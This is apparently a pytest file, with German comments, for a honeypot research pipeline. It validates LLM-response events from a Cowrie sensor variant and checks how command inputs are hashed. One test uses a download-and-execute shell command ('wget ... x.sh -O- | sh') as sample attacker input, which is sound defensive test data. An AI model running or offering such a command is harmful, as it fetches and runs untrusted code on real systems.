"""Prüft ``cowrie.llm.response`` und den Roh-Hash von ``command.input`` (E-044).

Ohne Datenbank. Das Ereignis schreibt der Patch für cowrie-b
(``sensor/cowrie-b/cowrie-b.patch``) je Befehl in B. Seine Felder gehen in die
Auswertung (method.md V2, H3, Ausfallzeiten) und werden deshalb streng
geprüft.
"""

from __future__ import annotations

from datetime import datetime, timezone
from hashlib import sha256

import pytest

from app.events import KNOWN_EVENTIDS, LLM_OUTCOMES, EventRejected, normalize
from app.models import LLM_OUTCOMES as MODEL_OUTCOMES

NOW = datetime(2026, 10, 14, 12, 0, tzinfo=timezone.utc)
DIGEST = sha256(b"uname -a").hexdigest()


def response(**fields):
    base = {
        "eventid": "cowrie.llm.response",
        "timestamp": "2026-10-14T11:59:00.000000Z",
        "session": "0123456789ab",
        "sensor": "hp-b",
        "src_ip": "203.0.113.5",
        "command_index": 1,
        "outcome": "ok",
        "http_status": 200,
        "latency_ms": 1834,
        "output_chars": 57,
        "client_gone": False,
        "input_sha256": DIGEST,
        "message": "LLM response ok for command 1",
    }
    base.update(fields)
    return base


def command(text, **fields):
    base = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-10-14T11:58:59.000000Z",
        "session": "0123456789ab",
        "sensor": "hp-b",
        "src_ip": "203.0.113.5",
        "input": text,
        "message": f"CMD: {text}",
    }
    base.update(fields)
    return base


def test_the_eventid_is_known():
    assert "cowrie.llm.response" in KNOWN_EVENTIDS


def test_events_and_models_know_the_same_outcomes():
    assert set(LLM_OUTCOMES) == set(MODEL_OUTCOMES)


def test_a_valid_response_is_accepted():
    event = normalize(response(), now=NOW)
    assert event.variant == "b"
    assert event.fields["llm"] == {
        "command_index": 1,
        "outcome": "ok",
        "http_status": 200,
        "latency_ms": 1834,
        "output_chars": 57,
        "client_gone": False,
    }
    assert event.fields["input_sha256"] == DIGEST


def test_the_hash_of_the_command_is_not_stored():
    """Ein einfacher SHA-256 ließe sich mit allen Adressen für <src> zurückrechnen."""
    event = normalize(response(), now=NOW)
    assert "input_sha256" not in event.payload
    assert DIGEST not in str(event.payload)


@pytest.mark.parametrize(
    ("outcome", "status", "latency", "chars"),
    [
        ("ok", 200, 10, 0),
        ("rate_limited", 429, 5, 0),
        ("unavailable", 503, 5, 0),
        ("upstream_error", 502, 5, 0),
        ("timeout", 504, 30_000, 0),
        # Cowries eigenes Zeitlimit: keine Antwort, also kein Status.
        ("timeout", None, 58_000, 0),
        ("local_rate_limit", None, None, 0),
        ("error", 400, 5, 0),
        ("error", 500, 5, 0),
        # Keine Verbindung oder Fehler vor dem Senden.
        ("error", None, 3, 0),
        ("error", None, None, 0),
    ],
)
def test_every_outcome_with_its_status_is_accepted(outcome, status, latency, chars):
    event = normalize(
        response(outcome=outcome, http_status=status, latency_ms=latency, output_chars=chars), now=NOW
    )
    assert event.fields["llm"]["outcome"] == outcome


@pytest.mark.parametrize(
    "changes",
    [
        {"command_index": 0},
        {"command_index": -1},
        {"command_index": 1_000_001},
        {"command_index": "1"},
        {"command_index": True},
        {"command_index": 1.0},
        {"outcome": "OK"},
        {"outcome": "empty"},
        {"outcome": "client_gone"},
        {"outcome": None},
        # Status passt nicht zum Ausgang.
        {"outcome": "ok", "http_status": 204},
        {"outcome": "ok", "http_status": None},
        {"outcome": "rate_limited", "http_status": 503},
        {"outcome": "unavailable", "http_status": 429},
        {"outcome": "upstream_error", "http_status": 500},
        {"outcome": "timeout", "http_status": 502},
        {"outcome": "error", "http_status": 429},
        {"outcome": "error", "http_status": 200},
        {"outcome": "local_rate_limit", "http_status": 429},
        {"outcome": "local_rate_limit", "http_status": None, "latency_ms": 3},
        {"http_status": 99},
        {"http_status": 600},
        {"http_status": "200"},
        # Mit Antwort gibt es immer eine Antwortzeit.
        {"latency_ms": None},
        {"latency_ms": -1},
        {"latency_ms": 3_600_001},
        {"output_chars": -1},
        {"output_chars": None},
        {"outcome": "upstream_error", "http_status": 502, "output_chars": 3},
        {"client_gone": "false"},
        {"client_gone": None},
        {"client_gone": 0},
        {"input_sha256": "x" * 64},
        {"input_sha256": DIGEST.upper()},
        {"input_sha256": DIGEST[:63]},
        {"input_sha256": None},
    ],
)
def test_anything_else_is_rejected(changes):
    with pytest.raises(EventRejected, match="llm.response ungültig"):
        normalize(response(**changes), now=NOW)


@pytest.mark.parametrize("key", ["command_index", "outcome", "output_chars", "client_gone", "input_sha256"])
def test_a_missing_field_is_rejected(key):
    event = response()
    del event[key]
    with pytest.raises(EventRejected, match="llm.response ungültig"):
        normalize(event, now=NOW)


def test_only_variant_b_sends_responses():
    with pytest.raises(EventRejected, match="nur in Variante b"):
        normalize(response(sensor="hp-a"), now=NOW)
    with pytest.raises(EventRejected, match="nur in Variante b"):
        normalize(response(variant="a"), now=NOW)


# --- Roh-Hash von command.input -------------------------------------------------


def test_the_command_hash_is_taken_from_the_raw_input():
    """Vor Kürzen, Entfernen der Adressen und Entschärfen, sonst passte er nie."""
    text = "wget http://203.0.113.5/x.sh -O- | sh # 198.51.100.1"
    event = normalize(command(text, dst_ip="198.51.100.1"), now=NOW)
    assert event.fields["input"] != text
    assert event.fields["input_sha256"] == sha256(text.encode("utf-8")).hexdigest()


def test_the_command_hash_covers_more_than_what_is_stored():
    text = "x" * 10_000
    event = normalize(command(text), now=NOW)
    assert len(event.fields["input"]) < len(text)
    assert event.fields["input_sha256"] == sha256(text.encode("utf-8")).hexdigest()


def test_an_empty_or_missing_input_hashes_like_an_empty_command():
    empty = sha256(b"").hexdigest()
    assert normalize(command(""), now=NOW).fields["input_sha256"] == empty
    event = command("")
    del event["input"]
    assert normalize(event, now=NOW).fields["input_sha256"] == empty


def test_nul_and_non_ascii_are_hashed_as_sent():
    text = "echo \x00 grüße 😀"
    event = normalize(command(text), now=NOW)
    assert event.fields["input_sha256"] == sha256(text.encode("utf-8")).hexdigest()


def test_command_input_in_a_has_the_same_hash_as_in_b():
    """A bekommt input_ref ebenso, die Spalte ist für beide Varianten gleich."""
    a = normalize(command("id", sensor="hp-a"), now=NOW)
    b = normalize(command("id"), now=NOW)
    assert a.fields["input_sha256"] == b.fields["input_sha256"]
